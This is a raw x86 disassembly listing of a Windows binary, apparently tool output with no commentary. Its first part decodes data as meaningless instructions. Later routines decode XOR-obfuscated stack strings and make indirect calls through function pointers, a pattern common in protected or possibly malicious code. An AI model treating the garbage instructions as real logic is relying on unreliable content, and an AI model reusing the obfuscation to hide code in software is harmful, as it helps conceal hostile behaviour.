  425564:	mov    cl,0x8
  425566:	int    0x97
  425568:	mov    esi,DWORD PTR [edx-0x733f9e30]
  42556e:	add    eax,DWORD PTR [ecx-0x2a]
  425571:	sub    esp,DWORD PTR ds:0xcb8c5db3
  425577:	or     edi,esp
  425579:	test   cl,dl
  42557b:	div    ebx
  42557d:	cmp    DWORD PTR [eax],0xaf0d2def
  425583:	xchg   esp,eax
  425584:	xchg   ecx,eax
  425585:	inc    ecx
  425586:	mov    ebp,0xd821e6ca
  42558b:	or     dh,BYTE PTR [edx-0x80]
  42558e:	or     BYTE PTR [edx+ebx*8],ch
  425591:	test   DWORD PTR [eax-0x15],edi
  425594:	arpl   sp,bx
  425596:	xchg   edx,eax
  425597:	jne    0x4255f5
  425599:	inc    esp
  42559a:	sub    bh,cl
  42559c:	std    
  42559d:	jne    0x425548
  42559f:	or     DWORD PTR [ecx+0x4719aa7],edi
  4255a5:	xchg   esp,eax
  4255a6:	push   0xa7f6be67
  4255ab:	cli    
  4255ac:	mov    ch,0x1d
  4255ae:	pusha  
  4255af:	mov    edi,ebx
  4255b1:	cmc    
  4255b2:	cld    
  4255b3:	rcr    DWORD PTR [ebp-0x1aac3db1],cl
  4255b9:	loope  0x4255b6
  4255bb:	lfs    edx,FWORD PTR [ecx+0x3523b95e]
  4255c2:	mov    ds:0x3fbc47d2,al
  4255c7:	jne    0x42563d
  4255c9:	xchg   ecx,eax
  4255ca:	jb     0x4255c1
  4255cc:	ret    0x5441
  4255cf:	out    0x82,al
  4255d1:	add    eax,0x62273fa3
  4255d6:	in     eax,0x21
  4255d8:	pop    edx
  4255d9:	sbb    BYTE PTR [eax],0x9a
  4255dc:	mov    cl,0xe2
  4255de:	push   0xa1cf514d
  4255e3:	in     al,0x30
  4255e5:	mov    eax,0xc5918148
  4255ea:	or     DWORD PTR [ebx-0x1d],edx
  4255ed:	jne    0x42564f
  4255ef:	jmp    0x5238:0x8367077f
  4255f6:	jne    0x42566e
  4255f8:	lods   eax,DWORD PTR ds:[esi]
  4255f9:	jg     0x425632
  4255fb:	enter  0x4487,0x77
  4255ff:	xchg   ebx,eax
  425600:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425601:	mov    ss,ebp
  425603:	popa   
  425604:	dec    eax
  425605:	(bad)  
  425606:	xchg   ecx,eax
  425607:	iret   
  425608:	test   BYTE PTR ds:[ebx],al
  42560b:	adc    BYTE PTR [eax],ch
  42560d:	sbb    edi,0xbebdc623
  425613:	shl    BYTE PTR [eax-0x41866a12],0xa6
  42561a:	popa   
  42561b:	mov    DWORD PTR [edi+0x1],edx
  42561e:	mov    ah,0x7b
  425620:	adc    DWORD PTR [esp+edx*8-0x78008df0],eax
  425627:	jbe    0x425693
  425629:	inc    ebp
  42562a:	rcr    BYTE PTR [ebx],0x64
  42562d:	(bad)  
  42562e:	lock into 
  425630:	arpl   WORD PTR [edi-0x1ea7f6b4],cx
  425636:	repnz dec esi
  425638:	pop    es
  425639:	clc    
  42563a:	adc    DWORD PTR [ebx],edx
  42563c:	xchg   ebp,eax
  42563d:	or     edi,esi
  42563f:	xchg   ebp,eax
  425640:	adc    edx,ebx
  425642:	mov    al,ds:0x784a544d
  425647:	std    
  425648:	inc    edi
  425649:	jae    0x4256b8
  42564b:	test   eax,0x882b1527
  425650:	stos   DWORD PTR es:[edi],eax
  425651:	inc    esp
  425652:	(bad)  
  425653:	stc    
  425654:	sbb    eax,0x70217aad
  425659:	in     eax,dx
  42565a:	out    dx,eax
  42565b:	mov    DWORD PTR [eax+0x5a0fa391],ecx
  425661:	stos   BYTE PTR es:[edi],al
  425662:	imul   edi,DWORD PTR [ecx+0x24],0x60a9e68d
  425669:	sbb    DWORD PTR [ebx-0x69fee3a4],ebx
  42566f:	(bad)  
  425670:	sub    eax,0xad9b6eb3
  425675:	jecxz  0x4256af
  425677:	mov    al,ds:0x77954420
  42567c:	stos   BYTE PTR es:[edi],al
  42567d:	fsubr  DWORD PTR [ecx+0x15]
  425680:	mov    eax,0xabbcee51
  425685:	sahf   
  425686:	mov    esp,0x53f0510c
  42568b:	sbb    ebx,DWORD PTR [edi+ebx*4]
  42568e:	jecxz  0x4256de
  425690:	in     eax,dx
  425691:	mov    dh,0x4d
  425693:	dec    edx
  425694:	xor    eax,0xe74a15bb
  425699:	ins    DWORD PTR es:[edi],dx
  42569a:	jp     0x42570d
  42569c:	and    ch,BYTE PTR [ebp+0x40]
  42569f:	repnz fsubr DWORD PTR [edx+edx*4-0x73a5a256]
  4256a7:	xchg   esi,eax
  4256a8:	loope  0x4256fa
  4256aa:	cmp    eax,0x2e8eb261
  4256af:	out    0x63,eax
  4256b1:	pop    ecx
  4256b2:	xor    bl,dl
  4256b4:	sbb    dh,bh
  4256b6:	and    esp,0x6
  4256b9:	aam    0x55
  4256bb:	sahf   
  4256bc:	jmp    DWORD PTR [edi+0x19]
  4256bf:	push   es
  4256c0:	push   0x36993824
  4256c5:	mov    esi,0xcde70671
  4256ca:	je     0x4256b2
  4256cc:	sbb    eax,0xa8a972c8
  4256d1:	jno    0x42572b
  4256d3:	lds    esp,FWORD PTR [ecx-0x55b8f4ee]
  4256d9:	mov    al,ds:0xb7c47c24
  4256de:	stc    
  4256df:	cmp    eax,DWORD PTR [ecx+0x6a]
  4256e2:	mov    ds:0x9c515124,al
  4256e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4256e8:	sbb    al,0x8d
  4256ea:	aad    0xa7
  4256ec:	sub    eax,0xf3117fa4
  4256f1:	jl     0x42570f
  4256f3:	rcl    ch,cl
  4256f5:	ja     0x425764
  4256f7:	lea    ecx,[eax+0x718f08f2]
  4256fd:	push   ss
  4256fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4256ff:	lahf   
  425700:	stos   DWORD PTR es:[edi],eax
  425701:	mov    dh,0xa1
  425703:	scas   al,BYTE PTR es:[edi]
  425704:	idiv   al
  425706:	inc    ecx
  425707:	or     eax,0x8b4c74c8
  42570c:	in     eax,dx
  42570d:	jecxz  0x42569f
  42570f:	clc    
  425710:	(bad)  
  425711:	data16 aas 
  425713:	(bad)  
  425714:	je     0x42571a
  425716:	and    eax,0xe5f1cc7c
  42571b:	mov    ?,ebx
  42571d:	lea    edx,[ebp-0x61fd62b9]
  425723:	in     al,dx
  425724:	cdq    
  425725:	aas    
  425726:	mov    eax,ds:0xe3d621ce
  42572b:	scas   eax,DWORD PTR es:[edi]
  42572c:	out    0x3,al
  42572e:	sub    eax,0x7e5ed48f
  425733:	fwait
  425734:	mov    eax,ds:0x427cde32
  425739:	jl     0x4257a1
  42573b:	loope  0x42576a
  42573d:	pop    edx
  42573e:	dec    edx
  42573f:	adc    al,0xf4
  425741:	les    edi,FWORD PTR [esi]
  425743:	xor    ah,dl
  425745:	inc    ebp
  425746:	test   eax,0x3effddf8
  42574b:	adc    BYTE PTR [edi],ch
  42574d:	jp     0x4256f0
  42574f:	aas    
  425750:	dec    edx
  425751:	dec    esi
  425752:	push   ebp
  425753:	cmp    bh,BYTE PTR [eax]
  425755:	or     esi,DWORD PTR [eax+esi*4-0x2c]
  425759:	push   ds
  42575a:	cmp    BYTE PTR [ecx+0x6c],al
  42575d:	mov    ch,0xc7
  42575f:	(bad)  
  425760:	int3   
  425761:	cdq    
  425762:	xor    DWORD PTR [ecx],esp
  425764:	inc    ecx
  425765:	test   al,0xa7
  425767:	pop    ebp
  425768:	pop    ebx
  425769:	xor    eax,0x63190f61
  42576e:	sbb    BYTE PTR [edx-0x54],cl
  425771:	in     eax,0xed
  425773:	outs   dx,BYTE PTR ds:[esi]
  425774:	ds pop edx
  425776:	pop    ss
  425777:	sub    ecx,edi
  425779:	jae    0x425704
  42577b:	jmp    0x425703
  42577d:	mov    eax,0x1fe74bfe
  425782:	mov    ds:0x3577a0c5,al
  425787:	into   
  425788:	jno    0x42577d
  42578a:	jmp    0x98f9:0xfca075f5
  425791:	into   
  425792:	jmp    0x42579d
  425794:	jmp    0x7732:0x56808474
  42579b:	xchg   ebp,eax
  42579c:	fucom  st(0)
  42579e:	leave  
  42579f:	aas    
  4257a0:	fwait
  4257a1:	add    eax,0x2b0f46cf
  4257a6:	sub    eax,0x91587f60
  4257ab:	xor    edx,DWORD PTR [edx+edx*4-0x9]
  4257af:	cs mov edx,0x346d1cae
  4257b5:	aam    0x7b
  4257b7:	sbb    ebp,edi
  4257b9:	ja     0x425771
  4257bb:	adc    BYTE PTR [ebp+0x4a],0x6
  4257bf:	out    0x35,al
  4257c1:	inc    esp
  4257c2:	push   ebp
  4257c3:	pop    ebp
  4257c4:	ret    0xa15f
  4257c7:	ror    BYTE PTR [edi],cl
  4257c9:	test   al,0x5c
  4257cb:	aam    0x25
  4257cd:	jb     0x1900348f
  4257d3:	adc    DWORD PTR [eax],edx
  4257d5:	xchg   edx,eax
  4257d6:	leave  
  4257d7:	stos   DWORD PTR es:[edi],eax
  4257d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4257d9:	repz sub al,0x23
  4257dc:	iret   
  4257dd:	fdiv   st(6),st
  4257df:	sub    bh,BYTE PTR [ecx+0x1aa2ff50]
  4257e5:	pop    ds
  4257e6:	push   es
  4257e7:	xor    al,ch
  4257e9:	add    DWORD PTR [ebx],ebx
  4257eb:	jl     0x4257e5
  4257ed:	inc    edi
  4257ee:	pop    ss
  4257ef:	ror    DWORD PTR [esi],1
  4257f1:	adc    BYTE PTR [edi+0x76],bl
  4257f4:	mov    dl,0xdb
  4257f6:	inc    eax
  4257f7:	rol    BYTE PTR ds:0x77f7820f,0x76
  4257fe:	mov    al,0x1c
  425800:	aas    
  425801:	jmp    0x1953:0x5b21a45
  425808:	dec    ecx
  425809:	sbb    eax,DWORD PTR [esi-0x2b]
  42580c:	mov    eax,ds:0xdb00623f
  425811:	repz cld 
  425813:	cmc    
  425814:	adc    al,0xfa
  425816:	xchg   ebp,eax
  425817:	popa   
  425818:	in     al,0xaa
  42581a:	and    BYTE PTR [ebx-0xd6433e],cl
  425820:	sub    al,0xbf
  425822:	jmp    0x6284acf0
  425827:	or     ah,dh
  425829:	add    bh,BYTE PTR [ecx-0x230eb86e]
  42582f:	adc    DWORD PTR [edi-0x49fb0808],esi
  425835:	xchg   edx,eax
  425836:	shl    DWORD PTR [eax+eax*4-0x4],cl
  42583a:	pop    ss
  42583b:	outs   dx,BYTE PTR ds:[esi]
  42583c:	hlt    
  42583d:	push   ds
  42583e:	or     al,0xe8
  425840:	xchg   esi,eax
  425841:	cmp    BYTE PTR [esi+0x60],dh
  425844:	jle    0x4257ec
  425846:	pop    edi
  425847:	das    
  425848:	into   
  425849:	cmp    al,0x8e
  42584b:	xor    DWORD PTR [ecx],esi
  42584d:	sahf   
  42584e:	ror    DWORD PTR ds:0xaa978883,1
  425854:	cs xor dl,bl
  425857:	push   es
  425858:	dec    edx
  425859:	ins    BYTE PTR es:[edi],dx
  42585a:	cmp    edi,eax
  42585c:	je     0x4258b1
  425862:	mov    DWORD PTR [ebp-0xc],esi
  425865:	mov    eax,DWORD PTR [ebp-0xc]
  425868:	mov    esi,DWORD PTR [ebp+0xc]
  42586b:	xor    eax,ecx
  42586d:	lea    eax,[eax*8+0x1939820]
  425874:	mov    eax,DWORD PTR [esi+eax*1]
  425877:	mov    DWORD PTR [ebp+0xc],eax
  42587a:	mov    eax,DWORD PTR [ebp-0x4]
  42587d:	mov    esi,DWORD PTR [ebp-0x8]
  425880:	xor    eax,ecx
  425882:	xor    esi,ecx
  425884:	add    esi,edx
  425886:	add    eax,edx
  425888:	imul   eax,esi
  42588b:	mov    esi,DWORD PTR [ebp+0xc]
  42588e:	cmp    esi,eax
  425890:	je     0x4258b1
  425896:	mov    eax,DWORD PTR [ebp-0x4]
  425899:	xor    eax,ecx
  42589b:	mov    ecx,DWORD PTR [ebp+0xc]
  42589e:	add    eax,edx
  4258a0:	imul   eax,ecx
  4258a3:	add    eax,DWORD PTR [ebp+0x8]
  4258a6:	mov    DWORD PTR [ebp+0xc],eax
  4258a9:	mov    eax,DWORD PTR [ebp+0xc]
  4258ac:	jmp    0x4258c2
  4258b1:	mov    eax,DWORD PTR [ebp-0x4]
  4258b4:	mov    esi,DWORD PTR [ebp-0x8]
  4258b7:	xor    esi,ecx
  4258b9:	xor    eax,ecx
  4258bb:	add    esi,edx
  4258bd:	add    eax,edx
  4258bf:	imul   eax,esi
  4258c2:	pop    edi
  4258c3:	pop    esi
  4258c4:	leave  
  4258c5:	ret    0x8
	...
  4258d4:	int3   
  4258d5:	cmp    al,0xf3
  4258d7:	dec    ebp
  4258d8:	add    BYTE PTR [eax],al
  4258da:	add    BYTE PTR [eax],al
  4258dc:	add    al,BYTE PTR [eax]
  4258de:	add    BYTE PTR [eax],al
  4258e0:	add    BYTE PTR ss:[eax],al
  4258e3:	add    al,dh
  4258e5:	pop    eax
  4258e6:	add    al,BYTE PTR [eax]
  4258e8:	lock dec esp
  4258ea:	add    al,BYTE PTR [eax]
  4258ec:	add    BYTE PTR [eax],al
  4258ee:	add    BYTE PTR [eax],al
  4258f0:	push   edx
  4258f1:	push   ebx
  4258f2:	inc    esp
  4258f3:	push   ebx
  4258f4:	mov    dh,0x97
  4258f6:	clc    
  4258f7:	(bad)  
  4258f8:	enter  0xb42b,0x48
  4258fc:	mov    eax,0xcf6cb4a0
  425901:	add    al,0xcc
  425903:	sti    
  425904:	add    DWORD PTR [eax],eax
  425906:	add    BYTE PTR [eax],al
  425908:	inc    edi
  425909:	cmp    bl,BYTE PTR [ebx+edx*2+0x79]
  42590d:	jae    0x42592f
  42590f:	inc    esp
  425910:	imul   esi,DWORD PTR [edx+0x20],0x5c6e6957
  425917:	inc    esi
  425918:	imul   ebp,DWORD PTR [ebp+eiz*2+0x44],0x49617461
  425920:	outs   dx,BYTE PTR ds:[esi]
  425921:	jae    0x42598c
  425923:	fs add BYTE PTR gs:[ebx-0x137e13ab],cl
  42592b:	or     BYTE PTR [ecx],al
  42592d:	add    BYTE PTR [eax],al
  42592f:	push   ebx
  425930:	mov    eax,ebx
  425932:	xchg   ecx,eax
  425933:	mov    eax,DWORD PTR [ebp+0x8]
  425936:	cmp    eax,0xf89c85a5
  42593b:	jne    0x425dfc
  425941:	mov    eax,DWORD PTR [ebp+0xc]
  425944:	cmp    eax,0xf89c85a2
  425949:	jne    0x425dfc
  42594f:	mov    eax,DWORD PTR [ebp+0x24]
  425952:	mov    DWORD PTR [ebp-0x4],eax
  425955:	mov    eax,DWORD PTR [ebp-0x4]
  425958:	mov    eax,DWORD PTR [eax+0x1d8]
  42595e:	mov    eax,DWORD PTR [eax]
  425960:	mov    eax,DWORD PTR [eax]
  425962:	mov    DWORD PTR [ebp-0x8],eax
  425965:	mov    BYTE PTR [ebp-0x18],0x1a
  425969:	mov    BYTE PTR [ebp-0x17],0x1f
  42596d:	mov    BYTE PTR [ebp-0x16],0x18
  425971:	mov    BYTE PTR [ebp-0x15],0x4e
  425975:	mov    BYTE PTR [ebp-0x14],0x51
  425979:	mov    BYTE PTR [ebp-0x13],0x83
  42597d:	mov    BYTE PTR [ebp-0x20],0xc
  425981:	mov    BYTE PTR [ebp-0x1f],0xe
  425985:	mov    BYTE PTR [ebp-0x1e],0x1c
  425989:	mov    BYTE PTR [ebp-0x1d],0x11
  42598d:	mov    BYTE PTR [ebp-0x1c],0x4e
  425991:	mov    BYTE PTR [ebp-0x1b],0x51
  425995:	mov    BYTE PTR [ebp-0x1a],0x83
  425999:	mov    BYTE PTR [ebp-0x28],0xe
  42599d:	mov    BYTE PTR [ebp-0x27],0x1b
  4259a1:	mov    BYTE PTR [ebp-0x26],0x17
  4259a5:	mov    BYTE PTR [ebp-0x25],0xa
  4259a9:	mov    BYTE PTR [ebp-0x24],0x20
  4259ad:	mov    BYTE PTR [ebp-0x23],0x13
  4259b1:	mov    BYTE PTR [ebp-0x22],0x18
  4259b5:	mov    BYTE PTR [ebp-0x21],0x83
  4259b9:	xor    ecx,ecx
  4259bb:	lea    eax,[ebp+ecx*1-0x18]
  4259bf:	movzx  edx,BYTE PTR [eax]
  4259c2:	xor    edx,0x7e
  4259c5:	add    edx,0x3
  4259c8:	inc    ecx
  4259c9:	mov    BYTE PTR [eax],dl
  4259cb:	cmp    ecx,0x6
  4259ce:	jb     0x4259bb
  4259d0:	xor    ecx,ecx
  4259d2:	lea    eax,[ebp+ecx*1-0x20]
  4259d6:	movzx  edx,BYTE PTR [eax]
  4259d9:	xor    edx,0x7e
  4259dc:	add    edx,0x3
  4259df:	inc    ecx
  4259e0:	mov    BYTE PTR [eax],dl
  4259e2:	cmp    ecx,0x7
  4259e5:	jb     0x4259d2
  4259e7:	xor    ecx,ecx
  4259e9:	lea    eax,[ebp+ecx*1-0x28]
  4259ed:	movzx  edx,BYTE PTR [eax]
  4259f0:	xor    edx,0x7e
  4259f3:	add    edx,0x3
  4259f6:	inc    ecx
  4259f7:	mov    BYTE PTR [eax],dl
  4259f9:	cmp    ecx,0x8
  4259fc:	jb     0x4259e9
  4259fe:	lea    eax,[ebp-0x2c]
  425a01:	mov    DWORD PTR [ebp-0x8],eax
  425a04:	mov    ecx,DWORD PTR [ebp-0x8]
  425a07:	mov    eax,0x7113fccf
  425a0c:	mov    DWORD PTR [ecx],eax
  425a0e:	mov    ecx,DWORD PTR [ebp-0x2c]
  425a11:	push   esi
  425a12:	push   edi
  425a13:	mov    esi,0x4e3e
  425a18:	mov    ebx,0x3272f5
  425a1d:	cmp    ecx,eax
  425a1f:	jne    0x425aea
  425a25:	lea    eax,[esi+0x39]
  425a28:	mov    WORD PTR [ebp-0x78],ax
  425a2c:	mov    eax,esi
  425a2e:	mov    WORD PTR [ebp-0x76],ax
  425a32:	add    eax,0x3f
  425a35:	mov    WORD PTR [ebp-0x74],ax
  425a39:	lea    eax,[esi-0x2]
  425a3c:	mov    WORD PTR [ebp-0x72],ax
  425a40:	add    eax,0x43
  425a43:	mov    ecx,eax
  425a45:	lea    eax,[esi-0x9]
  425a48:	mov    WORD PTR [ebp-0x66],ax
  425a4c:	mov    eax,esi
  425a4e:	mov    WORD PTR [ebp-0x64],ax
  425a52:	add    eax,0xffffffec
  425a55:	mov    WORD PTR [ebp-0x62],ax
  425a59:	mov    eax,0x443
  425a5e:	mov    WORD PTR [ebp-0x60],ax
  425a62:	mov    eax,0x5670
  425a67:	mov    WORD PTR [ebp-0x5e],ax
  425a6b:	mov    eax,0x6110
  425a70:	mov    WORD PTR [ebp-0x5c],ax
  425a74:	lea    eax,[ebp-0xe0]
  425a7a:	push   eax
  425a7b:	mov    eax,DWORD PTR [ebp+0xc]
  425a7e:	mov    edi,0x75108ae
  425a83:	xor    eax,edi
  425a85:	add    eax,ebx
  425a87:	push   eax
  425a88:	mov    WORD PTR [ebp-0x70],cx
  425a8c:	lea    ecx,[esi-0xe]
  425a8f:	mov    edx,ecx
  425a91:	lea    eax,[ebp-0x78]
  425a94:	push   eax
  425a95:	mov    eax,DWORD PTR [ebp-0x4]
  425a98:	mov    eax,DWORD PTR [eax+0x198]
  425a9e:	mov    WORD PTR [ebp-0x6e],dx
  425aa2:	mov    edx,0x4f8a
  425aa7:	mov    WORD PTR [ebp-0x6c],dx
  425aab:	mov    DWORD PTR [ebp-0x6a],0x4e7f4e31
  425ab2:	mov    DWORD PTR [ebp-0x5a],0x4e30f1e6
  425ab9:	mov    DWORD PTR [ebp-0xe0],0x1
  425ac3:	mov    DWORD PTR [ebp-0xdc],0x255
  425acd:	push   DWORD PTR [eax]
  425acf:	mov    eax,DWORD PTR [ebp+0x10]
  425ad2:	call   eax
  425ad4:	mov    DWORD PTR [ebp-0x8],eax
  425ad7:	mov    eax,DWORD PTR [ebp-0x8]
  425ada:	test   eax,eax
  425adc:	je     0x425aef
  425ade:	xor    DWORD PTR ds:0x76586876,0x87687666
  425ae8:	jmp    0x425aef
  425aea:	mov    edi,0x75108ae
  425aef:	mov    eax,DWORD PTR [ebp-0x4]
  425af2:	mov    ecx,DWORD PTR [eax+0x18c]
  425af8:	xor    eax,eax
  425afa:	cmp    DWORD PTR [ecx],eax
  425afc:	jne    0x425d6f
  425b02:	mov    ecx,DWORD PTR [ebp-0x4]
  425b05:	mov    ecx,DWORD PTR [ecx+0x17c]
  425b0b:	mov    DWORD PTR [ecx],eax
  425b0d:	mov    ecx,DWORD PTR [ebp-0x4]
  425b10:	mov    ecx,DWORD PTR [ecx+0x180]
  425b16:	mov    DWORD PTR [ecx],eax
  425b18:	mov    eax,0x4e6d
  425b1d:	mov    WORD PTR [ebp-0x9c],ax
  425b24:	mov    eax,esi
  425b26:	mov    WORD PTR [ebp-0x9a],ax
  425b2d:	mov    eax,0x4e7d
  425b32:	mov    WORD PTR [ebp-0x98],ax
  425b39:	add    eax,0xffffffc0
  425b3c:	mov    WORD PTR [ebp-0x96],ax
  425b43:	mov    eax,0x4f8e
  425b48:	mov    WORD PTR [ebp-0x94],ax
  425b4f:	mov    eax,0x4e32
  425b54:	mov    WORD PTR [ebp-0x92],ax
  425b5b:	add    eax,0x4d
  425b5e:	mov    WORD PTR [ebp-0x90],ax
  425b65:	mov    eax,0x4e30
  425b6a:	mov    WORD PTR [ebp-0x8e],ax
  425b71:	mov    eax,esi
  425b73:	mov    WORD PTR [ebp-0x8c],ax
  425b7a:	mov    eax,0x4e31
  425b7f:	mov    WORD PTR [ebp-0x8a],ax
  425b86:	mov    eax,0x99fd
  425b8b:	mov    WORD PTR [ebp-0x88],ax
  425b92:	mov    eax,0x8d62
  425b97:	mov    WORD PTR [ebp-0x86],ax
  425b9e:	mov    eax,0xd66f
  425ba3:	mov    WORD PTR [ebp-0x84],ax
  425baa:	mov    eax,0xd783
  425baf:	mov    WORD PTR [ebp-0x82],ax
  425bb6:	mov    eax,0x2780
  425bbb:	mov    WORD PTR [ebp-0x80],ax
  425bbf:	mov    eax,0x4780
  425bc4:	mov    WORD PTR [ebp-0x7e],ax
  425bc8:	mov    eax,0x4e33
  425bcd:	push   0x8
  425bcf:	mov    WORD PTR [ebp-0x7c],ax
  425bd3:	mov    DWORD PTR [ebp-0x10],0xa171b0e
  425bda:	mov    DWORD PTR [ebp-0xc],0x83181320
  425be1:	lea    eax,[ebp-0x10]
  425be4:	pop    ecx
  425be5:	mov    dl,BYTE PTR [eax]
  425be7:	xor    dl,0x7e
  425bea:	add    dl,0x3
  425bed:	mov    BYTE PTR [eax],dl
  425bef:	inc    eax
  425bf0:	dec    ecx
  425bf1:	jne    0x425be5
  425bf3:	lea    eax,[ebp-0x10]
  425bf6:	mov    DWORD PTR [ebp-0xdc],eax
  425bfc:	lea    eax,[ebp-0xe0]
  425c02:	push   eax
  425c03:	mov    eax,DWORD PTR [ebp+0xc]
  425c06:	xor    eax,edi
  425c08:	add    eax,ebx
  425c0a:	push   eax
  425c0b:	mov    eax,DWORD PTR [ebp-0x4]
  425c0e:	add    eax,0x66
  425c11:	push   eax
  425c12:	mov    eax,DWORD PTR [ebp-0x4]
  425c15:	mov    eax,DWORD PTR [eax+0x198]
  425c1b:	mov    DWORD PTR [ebp-0xe0],0x1
  425c25:	push   DWORD PTR [eax]
  425c27:	mov    eax,DWORD PTR [ebp+0x10]
  425c2a:	call   eax
  425c2c:	mov    ecx,DWORD PTR [ebp+0x8]
  425c2f:	xor    ecx,edi
  425c31:	add    ecx,ebx
  425c33:	mov    DWORD PTR [ebp-0x8],eax
  425c36:	cmp    eax,ecx
  425c38:	jne    0x425c53
  425c3a:	mov    eax,ds:0x33730bcc
  425c3f:	or     eax,0x22150bcf
  425c44:	mov    ds:0x33730bcc,eax
  425c49:	add    eax,0x3372e92f
  425c4e:	mov    ds:0x33730bcc,eax
  425c53:	mov    ecx,0x4e66
  425c58:	mov    eax,ecx
  425c5a:	mov    WORD PTR [ebp-0x40],ax
  425c5e:	add    eax,0x5
  425c61:	mov    edx,eax
  425c63:	mov    WORD PTR [ebp-0x3e],dx
  425c67:	mov    edx,0x4f93
  425c6c:	mov    WORD PTR [ebp-0x3c],dx
  425c70:	add    edx,0xfffffff8
  425c73:	mov    WORD PTR [ebp-0x3a],dx
  425c77:	mov    edx,0x4f89
  425c7c:	mov    WORD PTR [ebp-0x38],dx
  425c80:	add    edx,0x3
  425c83:	mov    WORD PTR [ebp-0x36],dx
  425c87:	mov    edx,0x4f87
  425c8c:	mov    WORD PTR [ebp-0x34],dx
  425c90:	mov    WORD PTR [ebp-0x32],cx
  425c94:	mov    ecx,esi
  425c96:	mov    WORD PTR [ebp-0x30],cx
  425c9a:	lea    ecx,[edx-0x1]
  425c9d:	mov    edx,ecx
  425c9f:	mov    WORD PTR [ebp-0x54],dx
  425ca3:	mov    edx,eax
  425ca5:	mov    WORD PTR [ebp-0x52],dx
  425ca9:	mov    edx,0x4e73
  425cae:	mov    WORD PTR [ebp-0x50],dx
  425cb2:	mov    WORD PTR [ebp-0x4e],ax
  425cb6:	lea    eax,[edx-0xa]
  425cb9:	mov    WORD PTR [ebp-0x4c],ax
  425cbd:	add    eax,0x3
  425cc0:	mov    WORD PTR [ebp-0x4a],ax
  425cc4:	lea    eax,[edx-0xc]
  425cc7:	mov    WORD PTR [ebp-0x48],ax
  425ccb:	mov    WORD PTR [ebp-0x46],cx
  425ccf:	mov    WORD PTR [ebp-0x44],si
  425cd3:	mov    eax,DWORD PTR [ebp+0x8]
  425cd6:	movzx  ecx,WORD PTR [ebp-0x54]
  425cda:	xor    eax,edi
  425cdc:	add    eax,ebx
  425cde:	xor    eax,ecx
  425ce0:	mov    WORD PTR [ebp-0x54],ax
  425ce4:	mov    eax,DWORD PTR [ebp+0x8]
  425ce7:	movzx  ecx,WORD PTR [ebp-0x40]
  425ceb:	xor    eax,edi
  425ced:	add    eax,ebx
  425cef:	xor    eax,ecx
  425cf1:	mov    WORD PTR [ebp-0x40],ax
  425cf5:	xor    eax,eax
  425cf7:	mov    WORD PTR [ebp-0xf4],ax
  425cfe:	mov    WORD PTR [ebp-0x108],ax
  425d05:	mov    edi,DWORD PTR [ebp+0x24]
  425d08:	lea    eax,[ebp-0xf4]
  425d0e:	lea    edx,[ebp-0x54]
  425d11:	mov    DWORD PTR [ebp-0xe0],0x2
  425d1b:	mov    DWORD PTR [ebp-0xdc],eax
  425d21:	call   0x428759
  425d26:	mov    DWORD PTR [ebp-0xd8],eax
  425d2c:	lea    eax,[ebp-0xe0]
  425d32:	push   eax
  425d33:	mov    eax,DWORD PTR [ebp+0xc]
  425d36:	xor    eax,0x75108ae
  425d3b:	add    eax,ebx
  425d3d:	push   eax
  425d3e:	lea    eax,[ebp-0x9c]
  425d44:	push   eax
  425d45:	push   DWORD PTR [ebp-0x8]
  425d48:	mov    eax,DWORD PTR [ebp+0x10]
  425d4b:	call   eax
  425d4d:	mov    edi,DWORD PTR [ebp+0x24]
  425d50:	lea    eax,[ebp-0x108]
  425d56:	lea    edx,[ebp-0x40]
  425d59:	mov    DWORD PTR [ebp-0xdc],eax
  425d5f:	call   0x428759
  425d64:	mov    DWORD PTR [ebp-0xd8],eax
  425d6a:	mov    edi,0x75108ae
  425d6f:	mov    eax,DWORD PTR [ebp+0x14]
  425d72:	push   DWORD PTR [ebp-0x4]
  425d75:	push   DWORD PTR [ebp+0x20]
  425d78:	push   DWORD PTR [ebp+0x1c]
  425d7b:	push   DWORD PTR [ebp+0x18]
  425d7e:	push   DWORD PTR [ebp+0x10]
  425d81:	push   DWORD PTR [ebp+0x8]
  425d84:	push   DWORD PTR [ebp+0xc]
  425d87:	call   0x426ffa
  425d8c:	test   eax,eax
  425d8e:	je     0x425dd2
  425d90:	add    DWORD PTR [ebp-0x4],eax
  425d93:	push   DWORD PTR [ebp-0x4]
  425d96:	lea    esi,[ebp+0x4]
  425d99:	call   0x4261ea
  425d9e:	mov    eax,DWORD PTR [ebp-0x4]
  425da1:	mov    eax,DWORD PTR [eax+0x1c8]
  425da7:	mov    eax,DWORD PTR [eax]
  425da9:	xor    eax,edi
  425dab:	add    eax,ebx
  425dad:	mov    eax,DWORD PTR [ebp-0x4]
  425db0:	jne    0x425dc8
  425db2:	mov    ecx,DWORD PTR [ebp-0x4]
  425db5:	mov    ecx,DWORD PTR [ecx+0x1cc]
  425dbb:	push   DWORD PTR [ecx]
  425dbd:	mov    eax,DWORD PTR [eax+0x1e0]
  425dc3:	call   DWORD PTR [eax+0x28]
  425dc6:	jmp    0x425dd2
  425dc8:	mov    eax,DWORD PTR [eax+0x17c]
  425dce:	mov    eax,DWORD PTR [eax]
  425dd0:	add    DWORD PTR [esi],eax
  425dd2:	mov    eax,DWORD PTR [ebp-0x4]
  425dd5:	mov    eax,DWORD PTR [eax+0x1dc]
  425ddb:	dec    DWORD PTR [eax]
  425ddd:	mov    ecx,DWORD PTR [ebp-0x4]
  425de0:	mov    ecx,DWORD PTR [ecx+0x1d8]
  425de6:	mov    eax,DWORD PTR [eax]
  425de8:	lea    eax,[ecx+eax*4]
  425deb:	mov    ecx,DWORD PTR [ebp-0x4]
  425dee:	mov    ecx,DWORD PTR [ecx+0x17c]
  425df4:	mov    eax,DWORD PTR [eax]
  425df6:	mov    ecx,DWORD PTR [ecx]
  425df8:	add    DWORD PTR [eax],ecx
  425dfa:	pop    edi
  425dfb:	pop    esi
  425dfc:	pop    ebx
  425dfd:	leave  
  425dfe:	ret    0x20
  425e01:	push   edi
  425e02:	push   esi
  425e03:	push   ebx
  425e04:	push   ebp
  425e05:	mov    ebp,esp
  425e07:	mov    eax,DWORD PTR [ebp+0x24]
  425e0a:	add    DWORD PTR [ebp+0x28],eax
  425e0d:	push   eax
  425e0e:	cld    
  425e0f:	mov    esi,DWORD PTR [ebp+0x18]
  425e12:	add    DWORD PTR [ebp+0x1c],esi
  425e15:	push   esi
